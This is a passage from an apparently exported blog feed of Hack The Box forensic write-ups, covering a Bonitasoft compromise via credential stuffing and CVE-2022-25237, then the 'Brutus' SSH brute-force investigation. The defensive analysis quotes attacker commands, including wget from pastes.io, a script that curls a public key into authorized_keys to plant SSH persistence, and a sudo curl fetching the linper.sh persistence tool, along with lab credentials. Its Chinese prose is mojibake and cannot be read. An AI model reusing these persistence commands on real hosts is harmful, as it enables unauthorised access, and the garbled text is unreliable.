http">http &amp;&amp; !http.response.code &gt; 400 &amp;&amp; http.request.uri matches &quot;API&quot;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/2594437ac78f5ae0.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Which string was appended <span class="hljs-keyword">to</span> the API URL <span class="hljs-type">path</span> <span class="hljs-keyword">to</span> bypass the <span class="hljs-keyword">authorization</span> <span class="hljs-keyword">filter</span> <span class="hljs-keyword">by</span> the attacker<span class="hljs-string">&#x27;s exploit?</span><br><span class="hljs-string">:i18ntranslation</span><br></code></pre></td></tr></table></figure><h1 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h1><p>é¦–å…ˆè¿‡æ»¤å‡ºå¸¦æœ‰ POST è¯·æ±‚ <code>/bonita/loginservice</code> çš„æ•°æ®ï¼Œ118 æ¡</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http.request.method ==&quot;POST&quot; &amp;&amp; http.request.uri contains &quot;/bonita/loginservice&quot;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/24ef4bf790f7f03b.png"></p><p>æŠŠå¸¦æœ‰ <code>install</code> ç”¨æˆ·çš„æ•°æ®åŒ…è¿‡æ»¤äº†</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http.request.method ==&quot;POST&quot; &amp;&amp; http.request.uri contains &quot;/bonita/loginservice&quot; &amp;&amp; !http contains &quot;install&quot;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/df57b86c6dfdf705.png"></p><p>è¿‡æ»¤å‡ºæ¥äº† 59 æ¡</p><p><img src="https://img.dkdun.cn/v1/2025/12/61058c99549a3883.png"></p><p>ä½†æ˜¯å‘ç°å…¶ä¸­æœ‰å››æ¡æ˜¯é‡å¤çš„ï¼Œæ‰€ä»¥æ€»å…± 56 æ¡</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">How</span> many combinations of usernames <span class="hljs-keyword">and</span> passwords were used in the credential stuffing attack?<br>:<span class="hljs-number">56</span><br></code></pre></td></tr></table></figure><h1 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h1><p>æŸ¥çœ‹ä¼šè¯ä¿¡æ¯èƒ½å‘ç°ï¼Œç”¨æˆ· <code>seb.broom@forela.co.uk</code> å°è¯•ç™»é™†åçŠ¶æ€ç å˜æˆäº† 204 ï¼Œè¡¨åå·²ç»èº«ä»½éªŒè¯æˆåŠŸäº†</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=seb.broom@forela.co.uk&amp;password=g0vernm3nt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/85c6f2cc07e9613f.png"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">Which</span> username <span class="hljs-keyword">and</span> password combination was successful?<br><span class="hljs-symbol">:seb</span>.broom<span class="hljs-variable">@forela</span>.<span class="hljs-symbol">co.uk:</span>g0vernm3nt<br></code></pre></td></tr></table></figure><h1 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h1><p>ç»“åˆå‰é¢çš„æ¥çœ‹ï¼Œè¿™ä¸€æ®µæ˜¯åœ¨ç™»å½•æˆåŠŸä¹‹åï¼Œç„¶åè¿›è¡Œäº†å‡ ä¸ªæ“ä½œï¼š</p><ul><li><p>ä¸Šä¼  zip æ–‡ä»¶åˆ©ç”¨äº† CVE</p></li><li><p>æ‰§è¡Œ whoami</p></li><li><p>æ‰§è¡Œ cat &#x2F;etc&#x2F;passwd</p></li><li><p>åˆ é™¤ä¸Šä¼ çš„æ–‡ä»¶</p></li><li><p>åˆ©ç”¨ wget ä¸‹è½½æ–‡ä»¶</p></li></ul><p><img src="https://img.dkdun.cn/v1/2025/12/b4fbaa938f71fac0.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/37a99f2a47b58887.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/c0aca04cdf7ced22.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://pastes.io/raw/bx5gcr0et8<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ç½‘ç«™ä¸º ï¼špastes.io</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">If <span class="hljs-keyword">any</span>, which <span class="hljs-keyword">text</span> sharing site did <span class="hljs-keyword">the</span> attacker utilise?<br>:pastes.io<br></code></pre></td></tr></table></figure><h1 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h1><p>åŒæ ·å°è¯•  wget æ–‡ä»¶ä¸‹æ¥å‘ç°æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œç”¨äº <code>curl</code> è¯»å–å¦ä¸€ä¸ª <code>hffgra4unv</code> æ–‡ä»¶ï¼Œå¹¶å°†å…¶å†™å…¥ Ubuntu çš„ <code>authorized_keys</code> æ–‡ä»¶ä¸­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys<br><span class="hljs-built_in">sudo</span> service ssh restart<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/93e20f05d9fc32c4.png"></p><p>æ‰€ä»¥ <code>hffgra4unv</code> æ–‡ä»¶ä¸­æœ‰å…¬é’¥</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Please provide <span class="hljs-keyword">the</span> filename <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> public key used <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> attacker <span class="hljs-built_in">to</span> gain persistence <span class="hljs-keyword">on</span> <span class="hljs-title">our</span> <span class="hljs-title">host</span>.<br>:hffgra4unv<br></code></pre></td></tr></table></figure><h1 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a>Task 9</h1><p>å†™å…¥ <code>/home/ubuntu/.ssh/authorized_keys</code> ä¸­</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">Can</span> you confirm the file modified by the attacker to gain persistence?<br><span class="hljs-symbol">:/home/ubuntu/</span>.ssh/authorized_keys<br></code></pre></td></tr></table></figure><h1 id="Task-10"><a href="#Task-10" class="headerlink" title="Task 10"></a>Task 10</h1><p>æ ¹æ®çº¿ç´¢æŸ¥æ‰¾ï¼ŒæŒä¹…æ€§å¹¶ä¸”å¯¹è´¦æˆ·æ“ä½œï¼Œ<a href="https://attack.mitre.org/techniques/T1098/004/">Account Manipulation: SSH Authorized Keys</a></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">Can you confirm the MITRE technique ID <span class="hljs-keyword">of</span> this <span class="hljs-keyword">type</span> <span class="hljs-type">of </span>persistence mechanism?<br>:T1098.<span class="hljs-number">004</span><br></code></pre></td></tr></table></figure><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><h2 id="jq"><a href="#jq" class="headerlink" title="jq"></a>jq</h2><p>jq ç”¨äºå¤„ç† JSON è¾“å…¥ï¼Œå°†ç»™å®šè¿‡æ»¤å™¨åº”ç”¨äºå…¶ JSON æ–‡æœ¬è¾“å…¥å¹¶åœ¨æ ‡å‡†è¾“å‡ºä¸Šå°†è¿‡æ»¤å™¨çš„ç»“æœç”Ÿæˆä¸º JSON</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">-n, --null-input          ä½¿ç”¨ null ä½œä¸ºå•ä¸€è¾“å…¥å€¼ï¼›<br>-R, --raw-input           å°†æ¯è¡Œè¾“å…¥è§†ä¸ºåŸå§‹å­—ç¬¦ä¸²ï¼ˆè€ŒéJSONï¼‰ï¼›<br>-s, --slurp               å°†æ‰€æœ‰è¾“å…¥è¯»å–åˆ°ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œå¹¶ä½œä¸ºå•ä¸€è¾“å…¥å€¼ï¼›<br>-c, --compact-output      è¾“å‡ºç´§å‡‘æ ¼å¼ï¼ˆè€Œéç¾åŒ–æ ¼å¼ï¼‰ï¼›<br>-r, --raw-output          ç›´æ¥è¾“å‡ºå­—ç¬¦ä¸²ï¼ˆä¸è½¬ä¹‰ä¸”ä¸åŠ å¼•å·ï¼‰ï¼›<br>--raw-output0         åŒ -rï¼Œä½†æ¯æ¡è¾“å‡ºåè¿½åŠ  NULç©ºå­—ç¬¦ï¼›<br>-j, --join-output         åŒ -rï¼Œä½†è¾“å‡ºåä¸æ¢è¡Œï¼›<br>-a, --ascii-output        ä»…ç”¨ ASCII è½¬ä¹‰åºåˆ—è¾“å‡ºå­—ç¬¦ä¸²ï¼›<br>-S, --sort-keys           è¾“å‡ºæ—¶å¯¹æ¯ä¸ªå¯¹è±¡çš„é”®æ’åºï¼›<br>-C, --color-output        å½©è‰²è¾“å‡º JSONï¼›<br>-M, --monochrome-output   ç¦ç”¨å½©è‰²è¾“å‡ºï¼›<br>--tab                 ä½¿ç”¨åˆ¶è¡¨ç¬¦ç¼©è¿›ï¼›<br>--indent n            ä½¿ç”¨ n ä¸ªç©ºæ ¼ç¼©è¿›ï¼ˆæœ€å¤š7ä¸ªï¼‰ï¼›<br>--unbuffered          æ¯æ¬¡è¾“å‡ºåç«‹å³åˆ·æ–°è¾“å‡ºæµï¼›<br>--stream              ä»¥æµå¼å¤„ç†æ–¹å¼è§£æè¾“å…¥å€¼ï¼›<br>--stream-errors       åŒ --streamï¼Œå¹¶å°†è§£æé”™è¯¯æŠ¥å‘Šä¸ºæ•°ç»„ï¼›<br>--<span class="hljs-built_in">seq</span>                 æŒ‰ application/json-seq æ ¼å¼è§£æè¾“å…¥/è¾“å‡ºï¼›<br></code></pre></td></tr></table></figure><p>è¯¦ç»†æ•™ç¨‹ï¼š<a href="https://cn.linux-console.net/?p=11006">å¦‚ä½•ä½¿ç”¨ jq ä» Linux å‘½ä»¤è¡Œè§£æ json æ–‡ä»¶</a></p><h2 id="Credential-Stuffing"><a href="#Credential-Stuffing" class="headerlink" title="Credential Stuffing"></a>Credential Stuffing</h2><p>å‡­è¯å¡«å……ï¼Œä¹ æƒ¯æ€§ç§°ä¸º â€œæ’åº“â€ï¼Œå°±æ˜¯åˆ©ç”¨ä»ä¸€é¡¹æœåŠ¡ä¸Šçš„æ•°æ®æ³„éœ²ä¸­è·å¾—çš„ç™»å½•å‡­æ®å°è¯•ç™»å½•åˆ°å¦ä¸€ä¸ªä¸ç›¸å…³çš„æœåŠ¡ï¼Œè·å–å¯¹å…¶ä»–æœåŠ¡ä¸Šç”¨æˆ·å¸æˆ·çš„æœªæˆæƒè®¿é—®ã€‚ç®€å•æ¥è¯´å°±æ˜¯å‡å¦‚æ”»å‡»è€…åœ¨ä¸€ä¸ªæœåŠ¡ä¸Šçªƒå–äº†å¾ˆå¤šè´¦å·ï¼Œç„¶åä½¿ç”¨ç›¸åŒçš„ç™»å½•å‡­è¯å»ç™»å½•é“¶è¡Œè´¦æˆ·ï¼ŒçŒœæµ‹åœ¨é“¶è¡Œä¹Ÿæœ‰è¿™äº›è´¦æˆ·ä½¿ç”¨åŒæ ·çš„ç”¨æˆ·åå’Œå¯†ç ï¼ˆå› æ­¤ä¸è¦æ‰€æœ‰çš„è´¦æˆ·éƒ½ç”¨ç›¸åŒçš„å¯†ç hhhhï¼‰ã€‚åˆ©ç”¨çš„æ˜¯æ•°æ®æ³„éœ²ï¼Œæ‰€ä»¥å¤§å¤§æé«˜äº†æˆåŠŸç‡ã€‚</p><h2 id="CVE-2022-25237"><a href="#CVE-2022-25237" class="headerlink" title="CVE-2022-25237"></a>CVE-2022-25237</h2><p>è¯¦ç»†ä¿¡æ¯ï¼š<a href="https://rhinosecuritylabs.com/application-security/cve-2022-25237-bonitasoft-authorization-bypass/">CVE-2022-25237ï¼šBonitasoft æˆæƒç»•è¿‡å’Œ RCE</a></p><p>Bonita Web 2021.2 å—åˆ°èº«ä»½éªŒè¯&#x2F;æˆæƒç»•è¿‡æ¼æ´çš„å½±å“ï¼ŒåŸå› æ˜¯ <code>RestAPIAuthorizationFilter</code> ä¸­ä½¿ç”¨çš„æ’é™¤æ¨¡å¼è¿‡äºå®½æ³›ã€‚é€šè¿‡åœ¨ <code>URL</code> æœ«å°¾é™„åŠ  <code>;i18ntranslation</code> æˆ– <code>/../i18ntranslation/</code>ï¼Œæ²¡æœ‰æƒé™çš„ç”¨æˆ·å¯ä»¥è®¿é—®ç‰¹æƒ <code>API</code> ç«¯ç‚¹ï¼Œè¿™å¯èƒ½å¯¼è‡´é€šè¿‡æ»¥ç”¨ç‰¹æƒ <code>API</code> æ“ä½œç›´æ¥ RCEã€‚</p><p>æ¼æ´ç‚¹æ¥è‡ªç³»ç»Ÿä¸­çš„  <code>web.xml</code> æ–‡ä»¶ï¼Œç”¨äºå®šä¹‰ç³»ç»Ÿåº”ç”¨çš„è·¯ç”±å’Œå¦‚ä½•å¤„ç†è·¯ç”±çš„èº«ä»½éªŒè¯åŠæˆæƒ</p><h2 id="SSH-Authorized-Keys"><a href="#SSH-Authorized-Keys" class="headerlink" title="SSH Authorized Keys"></a>SSH Authorized Keys</h2><p>Linux å‘è¡Œç‰ˆå’Œ macOS é€šå¸¸ä½¿ç”¨åŸºäºå¯†é’¥çš„èº«ä»½éªŒè¯æ¥ä¿æŠ¤è¿œç¨‹ç®¡ç†çš„ SSH ä¼šè¯çš„èº«ä»½éªŒè¯è¿‡ç¨‹ã€‚SSH <code>authorized_keys</code> ä¸­çš„æ–‡ä»¶æŒ‡å®šå¯ç”¨äºç™»å½•é…ç½®æ–‡ä»¶æ‰€é’ˆå¯¹çš„ç”¨æˆ·å¸æˆ·çš„ SSH å¯†é’¥ã€‚æ­¤æ–‡ä»¶é€šå¸¸ä½äºç”¨æˆ·ä¸»ç›®å½•ä¸­çš„ ä¸‹çš„ <code>&lt;user-home&gt;/.ssh/authorized_keys</code>ã€‚ç”¨æˆ·å¯ä»¥ç¼–è¾‘ç³»ç»Ÿçš„ SSH é…ç½®æ–‡ä»¶ï¼Œå°†æŒ‡ä»¤ <code>PubkeyAuthentication</code> å’Œ <code>RSAAuthentication</code> ä¿®æ”¹ä¸ºå€¼ â€œyesâ€ï¼Œä»¥ç¡®ä¿å¯ç”¨å…¬é’¥å’Œ <code>RSA</code> èº«ä»½éªŒè¯ã€‚SSH é…ç½®æ–‡ä»¶é€šå¸¸ä½äº ä¸‹<code>/etc/ssh/sshd_config</code>ã€‚</p><p>æ”»å‡»è€…å¯ä»¥ç›´æ¥ä½¿ç”¨è„šæœ¬æˆ– shell å‘½ä»¤ä¿®æ”¹ SSH <code>authorized_keys</code> æ–‡ä»¶ï¼Œä»¥æ·»åŠ æ”»å‡»è€…æä¾›çš„å…¬é’¥ã€‚</p><p>å½“æˆ‘ä»¬éœ€è¦ ssh è¿œç¨‹è®¿é—®æœåŠ¡å™¨æ—¶ï¼Œä¼šç”Ÿæˆ ssh å…¬é’¥ï¼Œç„¶åæœ¬åœ°æœºå™¨å°†å…¬é’¥å†™å…¥åˆ°æœåŠ¡å™¨çš„ <code>.ssh/authorized_keys</code>ä¸­ï¼Œå®ç°å…å¯†ç™»å½•è¿æ¥ã€‚</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>å¤§è‡´æµç¨‹</p><ul><li>é€šè¿‡å‡­è¯å¡«å……çš„æ–¹å¼æ¥å¯¹æœåŠ¡å™¨è¿›è¡Œè¯·æ±‚</li><li>â€˜â€™<a href="mailto:&#x73;&#101;&#x62;&#x2e;&#x62;&#114;&#111;&#x6f;&#x6d;&#x40;&#x66;&#x6f;&#x72;&#101;&#x6c;&#x61;&#46;&#99;&#x6f;&#x2e;&#x75;&#107;">&#x73;&#101;&#x62;&#x2e;&#x62;&#114;&#111;&#x6f;&#x6d;&#x40;&#x66;&#x6f;&#x72;&#101;&#x6c;&#x61;&#46;&#99;&#x6f;&#x2e;&#x75;&#107;</a>:g0vernm3ntâ€æˆåŠŸç™»å½•</li><li>åˆ©ç”¨ CVE-2022-25237 æ¥ä¸Šä¼  <code>rce_api_extension.zip</code> æ–‡ä»¶ï¼Œç„¶åå†åˆ é™¤</li><li>é€šè¿‡è„šæœ¬å°†æ–°çš„ ssh å…¬é’¥è¦†ç›–å†™å…¥ <code>/home/ubuntu/.ssh/authorized_keys</code> ä¸­</li><li>ssh è¿æ¥ä¸‹è½½äº†ä¸€äº›è½¯ä»¶åŒ…</li><li>nmap å¯¹ IP:34.207.150.13 è¿›è¡Œç«¯å£æšä¸¾</li><li>ç»“æŸ ssh ä¼šè¯</li></ul><p><img src="https://img.dkdun.cn/v1/2025/12/e48656578bbfe459.png"></p><p>ä» 6385 å¼€å§‹å°±åœ¨å¯¹ç«¯å£è¿›è¡Œæ‰«æï¼Œåº”è¯¥æ˜¯æ‰“å¼€äº† nmap</p><p><img src="https://img.dkdun.cn/v1/2025/12/3da479c6bf97b741.png"></p><p>ç›´åˆ°æœ€åç»“æŸ ssh ä¼šè¯</p>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åº”æ€¥å“åº”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Brutus</title>
    <link href="/2025/03/24/HTB-Brutus/"/>
    <url>/2025/03/24/HTB-Brutus/</url>
    
    <content type="html"><![CDATA[<p>Intro to Blue Team </p><p>Levelï¼šVery Easy</p><span id="more"></span><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. Weâ€™ll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.</p><h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><p>æ‰“å¼€ <code>auth.log</code> æŸ¥çœ‹ï¼ˆçœ¼ç›è¦è™¾äº†ï¼‰</p><p><img src="https://img.dkdun.cn/v1/2025/12/75f9080b6ed8d64c.png"></p><p>æ—¥å¿—æ ¼å¼</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Timestamp</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">Hostname</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">Service</span>&gt;</span>[<span class="hljs-tag">&lt;<span class="hljs-name">process_id</span>&gt;</span>]: <span class="hljs-tag">&lt;<span class="hljs-name">Message</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨æ—¥å¿—ä¸­èƒ½å‘ç°ä¸€å¤§æ®µè¿ç»­çš„  <code>Failed...</code>  å­—æ ·çš„æ—¥å¿—</p><p><img src="https://img.dkdun.cn/v1/2025/12/6f0ec98bdd474f43.png"></p><p>è¿™ç§ä¸€èˆ¬æ˜¯åœ¨çˆ†ç ´äº†ï¼Œæ‰€ä»¥ IP ä¸ºï¼š65.2.161.68</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Analyze <span class="hljs-keyword">the</span> auth.<span class="hljs-built_in">log</span>. What is <span class="hljs-keyword">the</span> IP address used <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> attacker <span class="hljs-built_in">to</span> carry out <span class="hljs-keyword">a</span> brute force attack?<br>:<span class="hljs-number">65.2</span><span class="hljs-number">.161</span><span class="hljs-number">.68</span><br></code></pre></td></tr></table></figure><h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><p>åœ¨è¢«çˆ†ç ´ä¹‹ååˆåœ¨åé¢çœ‹åˆ°äº†ç™»å½•æˆåŠŸè®°å½•</p><p><img src="https://img.dkdun.cn/v1/2025/12/4b5c9bdd99f1fd23.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">The bruteforce attempts were successful <span class="hljs-keyword">and</span> attacker gained <span class="hljs-keyword">access</span> <span class="hljs-keyword">to</span> an account <span class="hljs-keyword">on</span> the <span class="hljs-keyword">server</span>. What <span class="hljs-keyword">is</span> the username <span class="hljs-keyword">of</span> the account?<br>:root<br></code></pre></td></tr></table></figure><h1 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h1><p>è¯»å– <code>wtmp</code> æ•°æ®ï¼Œæ‰¾åˆ° root ç”¨æˆ·ç™»å½•ä¿¡æ¯</p><p><img src="https://img.dkdun.cn/v1/2025/12/39b3938228f23bc3.png"></p><p><code>2024-03-06T06:32:45,387923+00:00</code> ä¹Ÿå°±æ˜¯ <code>2024-03-06 06:32:45</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Identify the <span class="hljs-type">timestamp</span> <span class="hljs-keyword">when</span> the attacker <span class="hljs-keyword">logged</span> <span class="hljs-keyword">in</span> manually <span class="hljs-keyword">to</span> the <span class="hljs-keyword">server</span> <span class="hljs-keyword">to</span> carry <span class="hljs-keyword">out</span> their objectives. The <span class="hljs-keyword">login</span> <span class="hljs-type">time</span> will be different than the authentication <span class="hljs-type">time</span>, <span class="hljs-keyword">and</span> can be <span class="hljs-built_in">found</span> <span class="hljs-keyword">in</span> the wtmp artifact.<br>:<span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-06</span> <span class="hljs-number">06</span>:<span class="hljs-number">32</span>:<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><h1 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h1><p>æŸ¥çœ‹å’Œ <code>wtmp</code> æ–‡ä»¶ä¸­ç™»å½•æ—¶é—´ä¸€æ ·çš„çš„ï¼Œå·®äº†ä¸€ç§’é’Ÿä½†è¿™æ˜¯æ­£å¸¸ç°è±¡ï¼Œå› ä¸ºéªŒè¯ <code>/etc/shadow</code> æ–‡ä»¶ä¸­çš„å“ˆå¸Œå’Œå¯åŠ¨äº¤äº’å¼ä¼šè¯éƒ½éœ€è¦èŠ±è´¹æ—¶é—´ï¼Œæ‰€ä»¥ç­”æ¡ˆå°±æ˜¯ <code>06:32:44</code> çš„ä¿¡æ¯ï¼Œåˆ›å»ºäº† <code>New Session 37</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/b02b710d73dcb1d9.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">SSH <span class="hljs-keyword">login</span> sessions are tracked <span class="hljs-keyword">and</span> assigned a <span class="hljs-keyword">session</span> number upon <span class="hljs-keyword">login</span>. What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">session</span> number assigned <span class="hljs-keyword">to</span> the attacker<span class="hljs-string">&#x27;s session for the user account from Question 2?</span><br><span class="hljs-string">:37</span><br></code></pre></td></tr></table></figure><h1 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h1><p>æŸ¥æ‰¾æ–°çš„ç”¨æˆ·ï¼Œé‚£è¯´æ˜è¿™ä¸ªç”¨æˆ·æˆåŠŸåˆ›å»ºï¼Œåœ¨æ—¥å¿—é‡Œå‘ç° <code>cyberjunkie</code> è¢«æ·»åŠ åˆ°äº† <code>sudo</code> ç»„ä¸­ï¼Œå¹¶ä¸”æœ‰å¯¹ <code>/etc/shadow</code> çš„è®¿é—®æƒé™</p><p><img src="https://img.dkdun.cn/v1/2025/12/b60aa9c7e4dce85a.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">The attacker added a <span class="hljs-built_in">new</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">as</span> part <span class="hljs-keyword">of</span> their persistence strategy <span class="hljs-keyword">on</span> the <span class="hljs-keyword">server</span> <span class="hljs-keyword">and</span> gave this <span class="hljs-built_in">new</span> <span class="hljs-keyword">user</span> account higher <span class="hljs-keyword">privileges</span>. What <span class="hljs-keyword">is</span> the <span class="hljs-type">name</span> <span class="hljs-keyword">of</span> this account?<br>:cyberjunkie<br></code></pre></td></tr></table></figure><h1 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h1><p><a href="https://attack.mitre.org/techniques/T1136/">MITRE ATT&amp;CK</a></p><p>åœ¨ç½‘ä¸Šæœåˆ°çš„ï¼š<a href="https://www.freebuf.com/articles/network/359282.html">ATT&amp;CK v10ç‰ˆæœ¬æˆ˜æœ¯ä»‹ç»â€”æŒä¹…åŒ–ï¼ˆäºŒï¼‰</a>ï¼ŒT1136</p><p>ä»æ—¥å¿—æ¥çœ‹ï¼Œåº”è¯¥æ˜¯ä½¿ç”¨çš„æœ¬åœ°åˆ›å»ºè´¦æˆ·ï¼ŒID ä¸º <code>T1136.001</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/3b7f63d0c168e49c.png"></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">What is the MITRE ATT&amp;CK<span class="hljs-built_in"> sub-technique </span>ID used for persistence by creating a<span class="hljs-built_in"> new </span>account?<span class="hljs-keyword"></span><br><span class="hljs-keyword">:T1136</span>.001<br></code></pre></td></tr></table></figure><h1 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h1><p>å¯ä»¥çœ‹åˆ° <code>session</code> åœ¨ <code>06:37:24</code> ç»“æŸï¼Œæ‰€ä»¥ç­”æ¡ˆä¸º <code>2024-03-06 06:37:24</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/c203cf4f5fd6e666.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-built_in">time</span> did <span class="hljs-keyword">the</span> attacker&#x27;s <span class="hljs-keyword">first</span> SSH session <span class="hljs-keyword">end</span> according <span class="hljs-keyword">to</span> auth.<span class="hljs-built_in">log</span>?<br>:<span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-06</span> <span class="hljs-number">06</span>:<span class="hljs-number">37</span>:<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><h1 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h1><p>åœ¨æ—¥å¿—ç»“å°¾å¤„èƒ½å‘ç°ä½¿ç”¨äº† <code>curl </code>å‘½ä»¤</p><p><img src="https://img.dkdun.cn/v1/2025/12/fa54c61ca2f90664.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/curl https:/</span><span class="hljs-regexp">/raw.githubusercontent.com/m</span>ontysecurity<span class="hljs-regexp">/linper/m</span>ain/linper.sh<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸‹è½½äº† <code>linper.sh</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">The</span> attacker logged into their backdoor account <span class="hljs-keyword">and</span> utilized their higher privileges to download a script. <span class="hljs-title class_">What</span> is the full command executed using sudo?<br><span class="hljs-symbol">:/usr/bin/curl</span> <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/raw.githubusercontent.com/montysecurity</span><span class="hljs-regexp">/linper/main</span><span class="hljs-regexp">/linper.sh</span><br></code></pre></td></tr></table></figure><h1 id="Analysis"><a href="#Analysis" class="headerlink" 